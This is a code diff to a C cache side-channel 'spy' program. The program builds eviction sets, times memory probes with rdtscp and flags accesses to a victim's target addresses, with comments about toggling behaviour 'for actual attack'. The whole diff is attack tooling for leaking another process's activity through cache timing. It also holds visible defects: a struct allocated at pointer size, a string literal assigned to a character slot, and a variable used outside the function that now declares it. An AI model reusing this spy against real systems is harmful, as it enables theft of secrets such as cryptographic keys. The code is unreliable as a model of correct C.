@@ -59,9 +59,10 @@ Targets *load_targets(char *target_path, char *offset_path)
     }
     Targets *targets = malloc(sizeof(Targets *));
     targets->number=0;
-
-    u64 *offsets = malloc(MAX_TARGETS*sizeof(u64)); // support 20 different adrs
-
+    
+    // support MAX_TARGETS different adrs
+    u64 *offsets = malloc(MAX_TARGETS*sizeof(u64)); 
+    
     // read line for line and parse linewise read string to pointers to get offsets and get number of targets
     while ((read = getline(&line, &len, fp)) != -1) {
         (&line)[strlen(line)-1] = "\0"; //delete "\n"
@@ -79,37 +80,16 @@ Targets *load_targets(char *target_path, char *offset_path)
     return targets;
 }
 
-Targets *init_spy(Config *spy_conf, char *target_filepath, char *offset_target){
-    printf("[+] spy: init spy\n");
-
-    // prepare monitoring
-    Targets *targets = load_targets(target_filepath, offset_target);
-    for(size_t i=0; i<targets->number; i++){
-        targets->addresses[i]->evset = find_evset(spy_conf, targets->addresses[i]->adrs);
-        targets->addresses[i]->msrmts = malloc(MSRMT_BUFFER*sizeof(uint64_t));
-    }    
-    printf("[+] spy: find evset done\n");       
-    return targets;
-}
-
-// free memory properly
-void close_spy(Config *conf, Targets *targets){
-    if(targets==NULL || targets->addresses==NULL) return;
-    else{
-        for(size_t i=0; i<targets->number; i++){
-            close_evsets(conf, targets->addresses[i]->evset);
-            munmap(targets->addresses[i]->mapping, targets->addresses[i]->map_len);
-            free(targets->addresses[i]->msrmts);
-            free(targets->addresses[i]);
-            targets->addresses[i]=NULL;
-        }
-        free(targets->addresses);
-        targets->addresses=NULL;
-        free(targets);
-        targets=NULL;
+void create_empty_file(const char *filePath) {
+    FILE *file = fopen(filePath, "w");
+    if (file == NULL) {
+        printf("Error creating file\n");
+        return;
     }
+    fclose(file);
 }
 
+// Append measurements to output file.
 void append_output(Targets *targets, const char *file_path) {
 	FILE *file = fopen(file_path, "a");
     if (file == NULL) {
@@ -142,48 +122,77 @@ void append_output(Targets *targets, const char *file_path) {
 	fclose(file);
 }
 
-void create_empty_file(const char *filePath) {
-    FILE *file = fopen(filePath, "w");
-    if (file == NULL) {
-        printf("Error creating file\n");
-        return;
-    }
-    fclose(file);
-}
+Targets *init_spy(Config *spy_conf, char *target_filepath, char *offset_target){
+    printf("[+] spy: init spy\n");
 
-void my_monitor(Config *spy_conf, Targets *targets){
-    int ctr =0, *hit_ctr=malloc(targets->number*sizeof(int));
-    for(size_t i=0; i<targets->number; i++) hit_ctr[i]=0;
-    unsigned long long old_tsc, tsc;
-    __asm__ __volatile__ ("rdtscp" : "=A" (tsc));
+    // prepare monitoring
+    Targets *targets = load_targets(target_filepath, offset_target);
+    for(size_t i=0; i<targets->number; i++){
+        targets->addresses[i]->evset = find_evset(spy_conf, targets->addresses[i]->adrs);
+        targets->addresses[i]->msrmts = malloc(MSRMT_BUFFER*sizeof(uint64_t));
+    }    
+
+    // Make sure output file exists.
     const char *output_filename = "./output_evict_time.log";
     create_empty_file(output_filename);
-    int first=targets->number;
-    while(1)
-    {
-        old_tsc = tsc;
-        __asm__ __volatile__ ("rdtscp" : "=A" (tsc));
-        while (tsc - old_tsc < 2500) __asm__ __volatile__ ("rdtscp" : "=A" (tsc));// TODO why 2500/500 cycles per slot now, depending on printf
 
-        // probe
+    printf("[+] spy: find evset done\n");       
+    return targets;
+}
+
+// free memory properly
+void close_spy(Config *conf, Targets *targets){
+    if(targets==NULL || targets->addresses==NULL) return;
+    else{
         for(size_t i=0; i<targets->number; i++){
-            targets->addresses[i]->msrmts[ctr]= probe_evset_single(targets->addresses[i]->adrs);
+            close_evsets(conf, targets->addresses[i]->evset);
+            munmap(targets->addresses[i]->mapping, targets->addresses[i]->map_len);
+            free(targets->addresses[i]->msrmts);
+            free(targets->addresses[i]);
+            targets->addresses[i]=NULL;
         }
+        free(targets->addresses);
+        targets->addresses=NULL;
+        free(targets);
+        targets=NULL;
+    }
+}
 
-        // evict
-        for(size_t i=0; i<targets->number; i++){
-            if(first>0) printf("%lu, %lx, %p\n", i, targets->addresses[i]->offset, targets->addresses[i]->evset);
-            if(first-->0) list_print(targets->addresses[i]->evset);
-            probe_evset_chase(spy_conf, targets->addresses[i]->evset);
-            // toggle during actual attack
-            if(targets->addresses[i]->msrmts[ctr] < spy_conf->threshold) printf("[i] my_monitor: detected 0x%lx: ctr %d, hit ctr %d\n", targets->addresses[i]->offset, ctr, ++hit_ctr[i]);
-        }        
+// Monitor target addresses.
+void my_monitor(Config *spy_conf, Targets *targets){
+    {
+        int ctr=0, *hit_ctr=malloc(targets->number*sizeof(int));
+        for(size_t i=0; i<targets->number; i++) hit_ctr[i]=0;
+        unsigned long long old_tsc, tsc;
+        __asm__ __volatile__ ("rdtscp" : "=A" (tsc));
+        
+        // Print information on first iteration.
+        int first=targets->number;
+        while(1){
+            old_tsc=tsc;
+            __asm__ __volatile__ ("rdtscp" : "=A" (tsc));
+            while (tsc - old_tsc < 2500) __asm__ __volatile__ ("rdtscp" : "=A" (tsc));// TODO why 2500/500 cycles per slot now, depending on printf
 
-        if(ctr++ >= MSRMT_BUFFER) {
-            ctr=0;
-            // Write results to file
-            append_output(targets, output_filename);
-            break; // toggle for actual attack
+            // probe
+            for(size_t i=0; i<targets->number; i++){
+                targets->addresses[i]->msrmts[ctr]=probe_evset_single(targets->addresses[i]->adrs);
+            }
+
+            // evict
+            for(size_t i=0; i<targets->number; i++){
+                if(first>0) printf("%lu, %lx, %p\n", i, targets->addresses[i]->offset, targets->addresses[i]->evset);
+                if(first-->0) list_print(targets->addresses[i]->evset);
+                probe_evset_chase(spy_conf, targets->addresses[i]->evset);
+                // Maybe toggle during actual attack.
+                if(targets->addresses[i]->msrmts[ctr] < spy_conf->threshold) printf("[i] my_monitor: detected 0x%lx: ctr %d, hit ctr %d\n", targets->addresses[i]->offset, ctr, ++hit_ctr[i]);
+            }        
+
+            if(ctr++ >= MSRMT_BUFFER) {
+                ctr=0;
+                // Write results to file
+                append_output(targets, output_filename);
+                break; // toggle for actual attack
+            }
         }
     }
     printf("finished\n");
@@ -202,7 +211,7 @@ void spy(char *victim_filepath, char *offset_filepath){
             return;
         }
     }
-    printf(" now!\n");
+    printf(" now...\n");
     my_monitor(spy_conf, targets);
 }
 
